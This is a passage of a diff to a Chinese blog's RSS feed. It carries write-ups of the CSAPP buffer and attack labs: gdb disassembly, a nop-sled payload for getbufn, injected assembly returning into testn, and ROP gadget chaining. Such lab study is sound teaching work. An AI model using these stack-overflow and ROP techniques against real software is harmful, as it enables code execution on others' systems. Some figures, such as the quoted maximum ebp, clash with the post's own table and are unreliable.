+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;   0x0804920f &amp;lt;+3&amp;gt;:	sub    $0x218,%&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;esp&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;# buf 的首地址空间离 ebp 有 520 个字节&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x08049215&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;+9&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&#34;n&#34;&gt;lea&lt;/span&gt;    &lt;span class=&#34;m&#34;&gt;-0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x208&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%ebp),%&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;eax&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;mh&#34;&gt;0x0804921b&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;+15&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&#34;n&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;%eax,(%&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;mh&#34;&gt;0x0804921e&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;+18&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&#34;n&#34;&gt;call&lt;/span&gt;   &lt;span class=&#34;mh&#34;&gt;0x8048cfa&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Gets&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;mh&#34;&gt;0x08049223&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;+23&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&#34;n&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;%&lt;span class=&#34;n&#34;&gt;eax&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;mh&#34;&gt;0x08049228&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;+28&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&#34;n&#34;&gt;leave&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;mh&#34;&gt;0x08049229&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;+29&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&#34;n&#34;&gt;ret&lt;/span&gt;    
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;End&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;assembler&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;dump.&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;在这一阶段，getbufn 会调用 5 次，每次的储存的 ebp 都不一样，官方文档表示这个差值会在 +- 240 的样子：&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://billc.oss-cn-shanghai.aliyuncs.com/img/2020-04-13-163954.png&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;&lt;img src=&#34;https://billc.oss-cn-shanghai.aliyuncs.com/img/2020-04-13-163954.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;img&#34;
+	
+	
+&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;接下来使用 gdb，在 getbufn 打下断点，连续 5 次查看 % ebp 的值，可以得到这五次 ebp 的值分别是在：&lt;/p&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th style=&#34;text-align: left&#34;&gt;No&lt;/th&gt;
+          &lt;th style=&#34;text-align: left&#34;&gt;p/x $ebp&lt;/th&gt;
+          &lt;th style=&#34;text-align: left&#34;&gt;p/x $ebp - 0x208&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;1&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;0x55683110&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;0x55682f08&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;2&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;0x556830b0&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;0x55682ea8&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;3&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;0x55683100&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;0x55682ef8&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;4&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;0x55683110&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;0x55682f08&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;5&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;0x55683180&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;0x55682f78&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;对应的，buf 的起始地址就是每一次记的 ebp 减去 208，也就是 520 字节。&lt;/p&gt;
+&lt;p&gt;所以每一次的地址是无法确认的。英文文档中介绍了可以使用 &lt;code&gt;nop sled&lt;/code&gt; 的方法来解决这一问题。参考 CSAPP 教材中的介绍：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://billc.oss-cn-shanghai.aliyuncs.com/img/2020-04-13-163955.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;图6&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;因为在这个实验中，栈的地址是变化的。我们不知道有效机器代码的入口地址了，因此我们需要在有效机器代码前填充大量的nop指令，只要程序可以跳转到这些nop指令中，那么最终就可以滑到有效的机器代码。&lt;/p&gt;
+&lt;p&gt;运行getbufn函数时，会随机在栈上分配一块存储地址，因此，getbufn的基址ebp时随机变化的。但是又要求我们写的跳转地址是固定的，所以我们应该在有效代码之前大量填充nop指令，让这段地址内的代码都会滑到这段nop之后的代码上。&lt;/p&gt;
+&lt;p&gt;由于栈上的机器代码是按地址由低向高顺序执行，要保证五次运行都能顺利执行有效机器代码，需要满足：跳转地址位于有效机器代码入口地址之前的nop机器指令填充区。这要求尽可能增大nop填充区，尽可能使有效机器代码段往后挪。&lt;/p&gt;
+&lt;p&gt;从反汇编可以看出，buf的首地址为ebp-0x208，所以buf总共的大小为520字节。考虑这个函数中，testn的ebp随每次输入都随机变化，但是栈顶esp的位置却不变，所以我们可以通过esp和ebp的关系来找出这个关系，从而进行攻击&lt;/p&gt;
+&lt;p&gt;首先在sub $0x218，esp这一句设置断点，并使用-n模式运行程序，并查看ebp的值。&lt;/p&gt;
+&lt;p&gt;我们要做的是找出最大的ebp值0x556835e0，再减去0x208，即为最高的buf的始地址为：0x556833D8。&lt;/p&gt;
+&lt;p&gt;如果将有效机器代码置于跳转地址之前，并将其它所有字符都用作nop指令，此时所有五个buf地址的写入都能满足跳转到地址0x556833D8后顺利到达有效机器代码&lt;/p&gt;
+&lt;p&gt;接下来需要处理的问题是注入并覆盖 ebp 后，把正确的 esp 还原回去。研究 testn 的部分汇编代码：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-s&#34; data-lang=&#34;s&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Dump&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;assembler&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;code&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;testn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;mh&#34;&gt;0x08048e26&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;+0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&#34;n&#34;&gt;push&lt;/span&gt;   &lt;span class=&#34;o&#34;&gt;%ebp
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;   0x08048e27 &amp;lt;+1&amp;gt;:	mov    %&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%ebp
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;   0x08048e29 &amp;lt;+3&amp;gt;:	push   %&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ebx&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;mh&#34;&gt;0x08048e2a&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;+4&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&#34;n&#34;&gt;sub&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x24&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%esp
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;   0x08048e2d &amp;lt;+7&amp;gt;:	call   0x8048d90 &amp;lt;uniqueval&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;   0x08048e32 &amp;lt;+12&amp;gt;:	mov    %&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;-0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;xc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%ebp)
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;   0x08048e35 &amp;lt;+15&amp;gt;:	call   0x804920c &amp;lt;getbufn&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;   0x08048e3a &amp;lt;+20&amp;gt;:	mov    %&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;%&lt;span class=&#34;n&#34;&gt;ebx&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;mh&#34;&gt;0x08048e3c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;+22&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&#34;n&#34;&gt;call&lt;/span&gt;   &lt;span class=&#34;mh&#34;&gt;0x8048d90&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;uniqueval&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;在每一次调用了 getbufn 之后，ebp 的值将会被 push 进去。这个 ebp 值是等于 testn 被调用的时候 esp 存储的值的。esp 先由于 push ebx 而减去了 4，再手动减去了 0x24，所以这个时候 exp + 0x28 的值就是传入了 getbufn 开始的时候 ebp 的值。&lt;/p&gt;
+&lt;p&gt;所以构造出来的汇编代码如下：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-s&#34; data-lang=&#34;s&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;lea&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x28&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%esp), %&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ebp&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x362d5a70&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; %&lt;span class=&#34;n&#34;&gt;eax&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;push&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x08048e3a&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ret&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th style=&#34;text-align: left&#34;&gt;地址&lt;/th&gt;
+          &lt;th style=&#34;text-align: left&#34;&gt;解释&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;返回地址&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;设置成缓冲区的首地址&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;ebp&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;占用4字节&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&amp;hellip;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&amp;hellip;&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;ebp - 520字节&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;buf 数组的初始地址，从这里开始注入修改 eax 的代码&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&amp;hellip;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&amp;hellip;&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;ebp - 0x218&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;esp，栈帧首地址&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+</description>
+        </item>
+        <item>
         <title>CSAPP:attack实验</title>
-        <link>http://chenyuan1125.github.io/p/csappattack%E5%AE%9E%E9%AA%8C/</link>
+        <link>chenyuan1125.github.io/p/csappattack%E5%AE%9E%E9%AA%8C/</link>
         <pubDate>Sun, 29 Sep 2024 00:00:00 +0000</pubDate>
         
-        <guid>http://chenyuan1125.github.io/p/csappattack%E5%AE%9E%E9%AA%8C/</guid>
-        <description>&lt;img src="http://chenyuan1125.github.io/p/csappattack%E5%AE%9E%E9%AA%8C/R.jpg" alt="Featured image of post CSAPP:attack实验" /&gt;&lt;h1 id=&#34;attack-lab&#34;&gt;Attack lab
+        <guid>chenyuan1125.github.io/p/csappattack%E5%AE%9E%E9%AA%8C/</guid>
+        <description>&lt;img src="chenyuan1125.github.io/chenyuan1125.github.io/p/csappattack%E5%AE%9E%E9%AA%8C/R.jpg" alt="Featured image of post CSAPP:attack实验" /&gt;&lt;h1 id=&#34;attack-lab&#34;&gt;Attack lab
 &lt;/h1&gt;&lt;p&gt;该实验在我电脑的wsl的ubuntu操作系统下无法正常运行，在debian环境下能正常运行，注意运行时要加上-q&lt;/p&gt;
 &lt;h2 id=&#34;part-icode-injection-attacks&#34;&gt;Part I:Code Injection Attacks
 &lt;/h2&gt;&lt;h3 id=&#34;level-1&#34;&gt;Level 1
@@ -74,11 +1311,13 @@
 &lt;/div&gt;&lt;h3 id=&#34;level-2&#34;&gt;Level 2
 &lt;/h3&gt;&lt;p&gt;level2需要将vlevel的值改成cookie值，再return到touch2函数入口处。&lt;/p&gt;
 &lt;p&gt;修改后的rsp寄存器如下所示：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://chenyuan1125.github.io/p/csappattack%E5%AE%9E%E9%AA%8C/assets/phase2.png&#34;
+&lt;p&gt;&lt;img src=&#34;chenyuan1125.github.io/p/csappattack%E5%AE%9E%E9%AA%8C/assets/phase2.png&#34;
 	width=&#34;743&#34;
 	height=&#34;584&#34;
-	srcset=&#34;http://chenyuan1125.github.io/p/csappattack%E5%AE%9E%E9%AA%8C/assets/phase2_hu13663029604867286409.png 480w, http://chenyuan1125.github.io/p/csappattack%E5%AE%9E%E9%AA%8C/assets/phase2_hu11577064378276042830.png 1024w&#34;
+	srcset=&#34;chenyuan1125.github.io/p/csappattack%E5%AE%9E%E9%AA%8C/assets/phase2_hu13663029604867286409.png 480w, chenyuan1125.github.io/p/csappattack%E5%AE%9E%E9%AA%8C/assets/phase2_hu11577064378276042830.png 1024w&#34;
 	loading=&#34;lazy&#34;
+	
+		alt=&#34;图1&#34;
 	
 	
 		class=&#34;gallery-image&#34; 
@@ -205,7 +1444,7 @@
 	
 	loading=&#34;lazy&#34;
 	
-		alt=&#34;img&#34;
+		alt=&#34;图2&#34;
 	
 	
 &gt;&lt;/p&gt;
@@ -249,7 +1488,7 @@
 	
 	loading=&#34;lazy&#34;
 	
-		alt=&#34;img&#34;
+		alt=&#34;图3&#34;
 	
 	
 &gt;&lt;/p&gt;
@@ -289,7 +1528,7 @@
 	
 	loading=&#34;lazy&#34;
 	
-		alt=&#34;img&#34;
+		alt=&#34;图4&#34;
 	
 	
 &gt;&lt;/p&gt;
@@ -309,13 +1548,13 @@
 &lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;针对这些防御措施，文档提供了攻击策略，即&lt;strong&gt;ROP：面向返回的程序设计&lt;/strong&gt;，就是在已经存在的程序中找到特定的以&lt;code&gt;ret&lt;/code&gt;结尾的指令序列为我们所用，称这样的代码段为&lt;code&gt;gadget&lt;/code&gt;，把要用到部分的地址压入栈中，每次&lt;code&gt;ret&lt;/code&gt;后又会取出一个新的&lt;code&gt;gadget&lt;/code&gt;，于是这样就能形成一个程序链，实现我们的目的。&lt;strong&gt;我喜欢将这种攻击方式称作“就地取材，拼凑代码”&lt;/strong&gt;。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://chenyuan1125.github.io/p/csappattack%E5%AE%9E%E9%AA%8C/assets/image-20240224165336733.png&#34;
+&lt;p&gt;&lt;img src=&#34;chenyuan1125.github.io/p/csappattack%E5%AE%9E%E9%AA%8C/assets/image-20240224165336733.png&#34;
 	width=&#34;1029&#34;
 	height=&#34;582&#34;
-	srcset=&#34;http://chenyuan1125.github.io/p/csappattack%E5%AE%9E%E9%AA%8C/assets/image-20240224165336733_hu7106984471997724594.png 480w, http://chenyuan1125.github.io/p/csappattack%E5%AE%9E%E9%AA%8C/assets/image-20240224165336733_hu16357492657825526984.png 1024w&#34;
+	srcset=&#34;chenyuan1125.github.io/p/csappattack%E5%AE%9E%E9%AA%8C/assets/image-20240224165336733_hu7106984471997724594.png 480w, chenyuan1125.github.io/p/csappattack%E5%AE%9E%E9%AA%8C/assets/image-20240224165336733_hu16357492657825526984.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
-		alt=&#34;image-20240224165336733&#34;
+		alt=&#34;图5&#34;
 	
 	
 		class=&#34;gallery-image&#34; 
@@ -324,13 +1563,13 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;同时也给出指令编码表&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://chenyuan1125.github.io/p/csappattack%E5%AE%9E%E9%AA%8C/assets/image-20240224165427601.png&#34;
+&lt;p&gt;&lt;img src=&#34;chenyuan1125.github.io/p/csappattack%E5%AE%9E%E9%AA%8C/assets/image-20240224165427601.png&#34;
 	width=&#34;1117&#34;
 	height=&#34;1141&#34;
-	srcset=&#34;http://chenyuan1125.github.io/p/csappattack%E5%AE%9E%E9%AA%8C/assets/image-20240224165427601_hu3870573879609345137.png 480w, http://chenyuan1125.github.io/p/csappattack%E5%AE%9E%E9%AA%8C/assets/image-20240224165427601_hu11996603093128378326.png 1024w&#34;
+	srcset=&#34;chenyuan1125.github.io/p/csappattack%E5%AE%9E%E9%AA%8C/assets/image-20240224165427601_hu3870573879609345137.png 480w, chenyuan1125.github.io/p/csappattack%E5%AE%9E%E9%AA%8C/assets/image-20240224165427601_hu11996603093128378326.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
-		alt=&#34;image-20240224165427601&#34;
+		alt=&#34;图6&#34;
 	
 	
 		class=&#34;gallery-image&#34; 
@@ -412,13 +1651,13 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ret&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://chenyuan1125.github.io/p/csappattack%E5%AE%9E%E9%AA%8C/assets/v2-13869934030a0538ae7f1e4a6ab42202_1440w.webp&#34;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;chenyuan1125.github.io/p/csappattack%E5%AE%9E%E9%AA%8C/assets/v2-13869934030a0538ae7f1e4a6ab42202_1440w.webp&#34;
 	width=&#34;1241&#34;
 	height=&#34;726&#34;
-	srcset=&#34;http://chenyuan1125.github.io/p/csappattack%E5%AE%9E%E9%AA%8C/assets/v2-13869934030a0538ae7f1e4a6ab42202_1440w_hu2488226402346328207.webp 480w, http://chenyuan1125.github.io/p/csappattack%E5%AE%9E%E9%AA%8C/assets/v2-13869934030a0538ae7f1e4a6ab42202_1440w_hu10118464121499149602.webp 1024w&#34;
+	srcset=&#34;chenyuan1125.github.io/p/csappattack%E5%AE%9E%E9%AA%8C/assets/v2-13869934030a0538ae7f1e4a6ab42202_1440w_hu2488226402346328207.webp 480w, chenyuan1125.github.io/p/csappattack%E5%AE%9E%E9%AA%8C/assets/v2-13869934030a0538ae7f1e4a6ab42202_1440w_hu10118464121499149602.webp 1024w&#34;
 	loading=&#34;lazy&#34;
 	
-		alt=&#34;img&#34;
+		alt=&#34;图7&#34;
 	
 	
 		class=&#34;gallery-image&#34; 
@@ -672,13 +1911,13 @@
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;按理说后面是91不是90(nop)，所以不能取，但在x86汇编中，0x91 表示 xchg eax, ecx 指令。这条指令的作用是交换 %eax 和 %ecx 寄存器的值。不影响寄存器的值，所以可以。&lt;/p&gt;
 &lt;h3 id=&#34;栈帧讲解-1&#34;&gt;栈帧讲解
